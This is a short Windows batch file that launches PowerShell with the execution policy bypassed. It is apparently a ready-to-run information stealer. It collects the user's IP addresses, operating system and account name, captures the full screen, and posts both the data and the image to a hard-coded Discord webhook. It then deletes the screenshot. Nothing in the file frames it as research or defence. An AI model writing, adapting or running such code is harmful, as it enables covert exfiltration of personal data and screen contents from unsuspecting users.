@echo off
powershell -NoProfile -ExecutionPolicy Bypass -Command "
$ipAddress = (Get-NetIPAddress | Where-Object { $_.AddressFamily -eq 'IPv4' }).IPAddress; 
$os = (Get-CimInstance -ClassName Win32_OperatingSystem).Caption; 
$username = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name; 
Add-Type -AssemblyName System.Windows.Forms; 
Add-Type -AssemblyName System.Drawing; 
$bounds = [System.Windows.Forms.SystemInformation]::VirtualScreen; 
$screenshot = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height; 
$graphics = [System.Drawing.Graphics]::FromImage($screenshot); 
$graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size); 
$screenshot.Save('C:\screenshot.png'); 
$graphics.Dispose(); $screenshot.Dispose(); 
$message = @{content = 'System Information: `nIP Address: $ipAddress `nOS: $os `nUsername: $username'}; 
$webhookUrl = 'https://discord.com/api/webhooks/1391532249156947998/6COjLrMLUvb8Oe3uqBg0DVlPhPVWdpj7_QXNwNN9NhWLrrlFvSpAwZWrxjsvu5UOvbtm'; 
Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/json' -Body ($message | ConvertTo-Json); 
Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType 'application/octet-stream' -Body ([System.IO.File]::ReadAllBytes('C:\screenshot.png')); 
del C:\screenshot.png
"
